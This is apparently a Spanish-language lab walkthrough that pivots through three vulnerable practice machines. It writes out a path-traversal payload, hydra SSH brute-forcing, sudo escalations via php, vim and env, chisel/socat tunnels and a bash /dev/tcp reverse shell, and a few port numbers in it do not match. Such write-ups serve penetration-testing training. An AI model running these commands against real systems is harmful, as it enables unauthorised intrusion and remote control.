En este escenario tenemos distintas máquinas conectadas entre ellas en un escenario de pivoting en red:
```bash
sudo bash auto_deploy.sh inclusion.tar trust.tar upload.tar walkingcms.tar whereismywebshell.tar
```
![[Pasted image 20240421145412.png]]
## PRIMERA MÁQUINA
Comenzamos enumerando puertos abiertos de la primera de ellas:
![[Pasted image 20240421145443.png]]
Esto corre por el puerto 80:
![[Pasted image 20240421145519.png]]
Haciendo fuzzing web nos encontramos con el directorio /shop:
![[Pasted image 20240421145553.png]]
Nos encontramos con una web que nos chiva el parámetro del index.php que podemos utilizar para explotar alguna vulnerabilidad:
![[Pasted image 20240421145717.png]]
Probamos el siguiente payload:
```bash
http://10.10.10.2/shop/index.php?archivo=../../../../../../etc/passwd
```
Y leemos archivos internos de la máquina:
![[Pasted image 20240421145741.png]]
Vemos dos usuarios, donde probamos primero con el usuario manchi por fuerza bruta contra el protocolo SSH:
```bash
hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.2
```
![[Pasted image 20240421145824.png]]
Accedemos por SSH:
![[Pasted image 20240421145839.png]]
En este punto, vemos otro usuario llamado seller, que tras enumerar por distintas vías, no conseguimos pivotar a él, por lo que probamos en hacerle un ataque de fuerza bruta a su contraseña utilizando algún script para hacer esto mismo:
```bash
https://github.com/Maalfer/Sudo_BruteForce
```
![[Pasted image 20240421150124.png]]
Lo pasamos todo a la máquina víctima, el script junto con el rockyou:
![[Pasted image 20240421150425.png]]
```bash
bash Linux-Su-Force.sh seller rockyou.txt 
```
Y nos encuentra su contraseña:
![[Pasted image 20240421150503.png]]
Nos encontramos con el binario de /usr/bin/php:
![[Pasted image 20240421150542.png]]
Escalamos privilegios de la siguiente forma:
```bash
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```
![[Pasted image 20240421150637.png]]
Vemos una segunda interfaz para pivotar hacia la siguiente máquina:
![[Pasted image 20240421150740.png]]
Nos creamos nuevas conexiones en esta máquina:
![[Pasted image 20240421152143.png]]

En este punto, nos enviamos chisel:
![[Pasted image 20240421150931.png]]
Ahora desde la máquina atacante nos ponemos en la escucha con chisel:
```bash
chisel server --reverse -p 1234
```
![[Pasted image 20240421151056.png]]
Y nos conectamos desde la máquina víctima para poder ver desde nuestro Kali a la IP 20.20.20.2:
```bash
./chisel client 192.168.0.20:1234 R:socks
```
![[Pasted image 20240421151218.png]]
![[Pasted image 20240421151225.png]]
## MÁQUINA 2
Para hacer un escaneo de puertos a la siguiente máquina, debemos de utilizar los siguientes comandos de nmap:
```bash
proxychains nmap -sT -Pn -p- -sV --open -T5 -v -n 20.20.20.3 2>/dev/null
```
Donde nos encuentra los puertos 22 y 80 abiertos:
![[Pasted image 20240421153233.png]]
En el puerto 80 corre una plantilla de apache por defecto:
![[Pasted image 20240421152505.png]]
Y esto corre en el /secret.php:
![[Pasted image 20240421152831.png]]
Nos proporcionan un usuario donde podemos hacer fuerza bruta con hydra:
```bash
proxychains hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://20.20.20.3 -I
```
![[Pasted image 20240421152940.png]]
Tenemos el acceso:
```bash
mario:chocolate
```
Entramos pasando por el tunel:
```bash
proxychains ssh mario@20.20.20.3
```
![[Pasted image 20240421153033.png]]
Y vemos que podemos ejecutar vim como root:
![[Pasted image 20240421153109.png]]
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```
Y ya somos root:
![[Pasted image 20240421153159.png]]
Comprobamos las interfaces de red:
![[Pasted image 20240421153334.png]]
Y obtenemos varias sesiones para tener persistencia:
![[Pasted image 20240421153535.png]]
Ahora desde la máquina inicial nos compartimos el chisel a esta siguiente máquina mediante un servidor HTTP con python:
![[Pasted image 20240421153655.png]]
![[Pasted image 20240421153703.png]]
Ahora desde la primera máquina vamos a necesitar socat para ir pasando la conexión de chisel:
```bash
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```
Lo obtenemos en la primera máquina:
![[Pasted image 20240421154200.png]]
Y decimos que todo lo que nos llegue a la IP 10.10.10.0/24 que lo mande a la máquina atacante por el puerto 1234, que es donde tenemos chisel escuchando:
```bash
./socat tcp-l:1111,fork,reuseaddr tcp:192.168.0.20:1234
```
![[Pasted image 20240421154643.png]]
Por tanto ahora que ya tenemos socat escuchando, vamos a usar chisel para enviar a la segunda interfaz de la primera máquina el nuevo tunel, que va a funcionar por el puerto 8888 por ejemplo:
```bash
./chisel client 20.20.20.2:1111 R:8888:socks
```
![[Pasted image 20240421155046.png]]
De tal forma que recibimos la conexión:
![[Pasted image 20240421155109.png]]
Ahora tenemos que editar el archivo proxychains.conf y vamos a editar el archivo de proxychains y descomentamos la línea donde dice scrict_chain:
![[Pasted image 20230816162618.png]]
Y comentamos esta línea:
![[Pasted image 20230816162719.png]]
Además de añadir este nuevo túnel en la parte de abajo:
![[Pasted image 20230816162645.png]]
Y ahora preparamos también el navegador para pasar por este otro nuevo túnel:
![[Pasted image 20240421155309.png]]
## MÁQUINA 3
Hacemos un escaneo de puertos con nmap a esta nueva dirección IP:
```bash
proxychains nmap -sT -Pn -p- -sV --open -T5 -v -n 30.30.30.3 2>/dev/null
```
![[Pasted image 20240421155840.png]]
Vemos que tenemos visibilidad con el puerto 80 de la 30.30.30.3:
![[Pasted image 20240421155827.png]]
Podemos hacer fuzzing web con gobuster pasando por el túnel de la siguiente forma:
```bash
gobuster dir -u http://30.30.30.3 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt --proxy socks5://127.0.0.1:8888
```
![[Pasted image 20240421155947.png]]
Vemos el directorio uploads:
![[Pasted image 20240421160010.png]]
Preparamos la reverse shell:
![[Pasted image 20240421160101.png]]
![[Pasted image 20240421160122.png]]
Ahora tenemos que preparar socat para que la reverse shell vaya desde esta IP 30.30.30.3 hasta nuestro Kali, por lo que enviaremos socat a la máquina anterior, desde la 10.10.10.0/24 a la 20.20.20.0/24:
![[Pasted image 20240421160336.png]]
Ahora con socat digo que todo lo que reciba por el puerto 2222 quiero que lo envíe a la máquina 20.20.20.2 a su puerto 2222, y a su vez que la 20.20.20.2 envíe la reverse shell a la máquina Kali por el puerto 443:
```bash
./socat tcp-l:2222,fork,reuseaddr tcp:20.20.20.2:2222
./socat tcp-l:2222,fork,reuseaddr tcp:192.168.0.20:443
```
Y desde esta última máquina la reverse shell que vamos a generar será la siguiente:
```bash
bash -c "bash -i >& /dev/tcp/30.30.30.2/2222 0>&1"
```
![[Pasted image 20240421162044.png]]
Y con netcat habremos recibido la conexión:
![[Pasted image 20240421162101.png]]
Y ahora repetimos la misma conexión para poder tener varias sesiones, todas ellas recibiéndolas por el puerto 443:
![[Pasted image 20240421162401.png]]
Ejecutando el comando sudo -l vemos que como root podemos ejecutar el binario de env, por lo que ejecutamos el siguiente comando y escalamos a root:
```bash
sudo /usr/bin/env /bin/sh
```
Y ahora ya tenemos varias sesiones en esta máquina:
![[Pasted image 20240421162704.png]]
Ahora vamos a hacer que todo lo que reciba la máquina 1 por el puerto 3333 que lo mande a chisel para poder llegar a esta última máquina:
```bash
./socat tcp-l:333,fork,reuseaddr tcp:192.168.0.20:1234
```
![[Pasted image 20240421163748.png]]
Y a su vez que la máquina siguiente todo lo que reciba por el puerto 333 lo envía a la 20.20.20.2:
```bash
./socat tcp-l:333,fork,reuseaddr tcp:20.20.20.2
```
![[Pasted image 20240421163828.png]]
Y ahora ya desde la última máquina lanzamos la conexión de chisel pasando por socat entre todos los túneles hasta nuestra máquina atacante:
```bash
./chisel client 30.30.30.2:333 R:9999:socks
```